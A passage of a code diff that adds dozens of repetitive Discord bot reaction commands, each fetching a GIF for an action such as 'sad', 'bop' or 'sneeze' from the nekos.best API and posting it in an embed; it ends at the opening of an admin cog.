+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="dizzy")
+    async def _dizzy(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} dizzys {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} dizzys!"
+
+        url = f"https://nekos.best/api/v2/dizzy"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="nervous")
+    async def _nervous(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} nervouss {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} nervouss!"
+
+        url = f"https://nekos.best/api/v2/nervous"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="excited")
+    async def _excited(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} exciteds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} exciteds!"
+
+        url = f"https://nekos.best/api/v2/excited"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="happy")
+    async def _happy(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} happys {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} happys!"
+
+        url = f"https://nekos.best/api/v2/happy"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="sad")
+    async def _sad(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} sads {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} sads!"
+
+        url = f"https://nekos.best/api/v2/sad"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="angry")
+    async def _angry(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} angrys {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} angrys!"
+
+        url = f"https://nekos.best/api/v2/angry"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="surprised")
+    async def _surprised(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} surpriseds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} surpriseds!"
+
+        url = f"https://nekos.best/api/v2/surprised"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="yawn")
+    async def _yawn(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} yawns {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} yawns!"
+
+        url = f"https://nekos.best/api/v2/yawn"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="stretch")
+    async def _stretch(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} stretchs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} stretchs!"
+
+        url = f"https://nekos.best/api/v2/stretch"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="bop")
+    async def _bop(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} bops {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} bops!"
+
+        url = f"https://nekos.best/api/v2/bop"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="spin")
+    async def _spin(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} spins {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} spins!"
+
+        url = f"https://nekos.best/api/v2/spin"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="jump")
+    async def _jump(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} jumps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} jumps!"
+
+        url = f"https://nekos.best/api/v2/jump"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="roll")
+    async def _roll(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} rolls {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} rolls!"
+
+        url = f"https://nekos.best/api/v2/roll"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="clap")
+    async def _clap(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} claps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} claps!"
+
+        url = f"https://nekos.best/api/v2/clap"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="praise")
+    async def _praise(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} praises {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} praises!"
+
+        url = f"https://nekos.best/api/v2/praise"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="tease")
+    async def _tease(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} teases {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} teases!"
+
+        url = f"https://nekos.best/api/v2/tease"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="beg")
+    async def _beg(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} begs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} begs!"
+
+        url = f"https://nekos.best/api/v2/beg"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="protect")
+    async def _protect(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} protects {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} protects!"
+
+        url = f"https://nekos.best/api/v2/protect"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="comfort")
+    async def _comfort(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} comforts {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} comforts!"
+
+        url = f"https://nekos.best/api/v2/comfort"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="glare")
+    async def _glare(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} glares {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} glares!"
+
+        url = f"https://nekos.best/api/v2/glare"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="mock")
+    async def _mock(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} mocks {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} mocks!"
+
+        url = f"https://nekos.best/api/v2/mock"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="salute")
+    async def _salute(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} salutes {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} salutes!"
+
+        url = f"https://nekos.best/api/v2/salute"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="bow")
+    async def _bow(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} bows {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} bows!"
+
+        url = f"https://nekos.best/api/v2/bow"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="cheerup")
+    async def _cheerup(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} cheerups {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} cheerups!"
+
+        url = f"https://nekos.best/api/v2/cheerup"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="snuggle")
+    async def _snuggle(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} snuggles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} snuggles!"
+
+        url = f"https://nekos.best/api/v2/snuggle"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="sniff")
+    async def _sniff(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} sniffs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} sniffs!"
+
+        url = f"https://nekos.best/api/v2/sniff"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="gasp")
+    async def _gasp(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} gasps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} gasps!"
+
+        url = f"https://nekos.best/api/v2/gasp"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="chuckle")
+    async def _chuckle(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} chuckles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} chuckles!"
+
+        url = f"https://nekos.best/api/v2/chuckle"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="giggle")
+    async def _giggle(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} giggles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} giggles!"
+
+        url = f"https://nekos.best/api/v2/giggle"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="grin")
+    async def _grin(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} grins {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} grins!"
+
+        url = f"https://nekos.best/api/v2/grin"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="smirk")
+    async def _smirk(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} smirks {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} smirks!"
+
+        url = f"https://nekos.best/api/v2/smirk"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="phew")
+    async def _phew(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} phews {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} phews!"
+
+        url = f"https://nekos.best/api/v2/phew"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="shiver")
+    async def _shiver(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} shivers {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} shivers!"
+
+        url = f"https://nekos.best/api/v2/shiver"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="tremble")
+    async def _tremble(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} trembles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} trembles!"
+
+        url = f"https://nekos.best/api/v2/tremble"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="faint")
+    async def _faint(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} faints {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} faints!"
+
+        url = f"https://nekos.best/api/v2/faint"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="sneeze")
+    async def _sneeze(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} sneezes {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} sneezes!"
+
+        url = f"https://nekos.best/api/v2/sneeze"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="cough")
+    async def _cough(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} coughs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} coughs!"
+
+        url = f"https://nekos.best/api/v2/cough"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="burp")
+    async def _burp(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} burps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} burps!"
+
+        url = f"https://nekos.best/api/v2/burp"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="hiccup")
+    async def _hiccup(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} hiccups {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} hiccups!"
+
+        url = f"https://nekos.best/api/v2/hiccup"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="snore")
+    async def _snore(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} snores {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} snores!"
+
+        url = f"https://nekos.best/api/v2/snore"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="daydream")
+    async def _daydream(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} daydreams {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} daydreams!"
+
+        url = f"https://nekos.best/api/v2/daydream"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="stumble")
+    async def _stumble(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} stumbles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} stumbles!"
+
+        url = f"https://nekos.best/api/v2/stumble"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="fall")
+    async def _fall(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} falls {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} falls!"
+
+        url = f"https://nekos.best/api/v2/fall"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="trip")
+    async def _trip(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} trips {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} trips!"
+
+        url = f"https://nekos.best/api/v2/trip"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="slip")
+    async def _slip(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} slips {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} slips!"
+
+        url = f"https://nekos.best/api/v2/slip"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="crash")
+    async def _crash(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} crashs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} crashs!"
+
+        url = f"https://nekos.best/api/v2/crash"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="bump")
+    async def _bump(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} bumps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} bumps!"
+
+        url = f"https://nekos.best/api/v2/bump"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="huggle")
+    async def _huggle(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} huggles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} huggles!"
+
+        url = f"https://nekos.best/api/v2/huggle"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+# ========================================
+# advanced_admin.py
+# ========================================
+class AdvancedAdmin(commands.Cog, name="advanced_admin"):
+    """1-10: advanced administrative controls."""
+
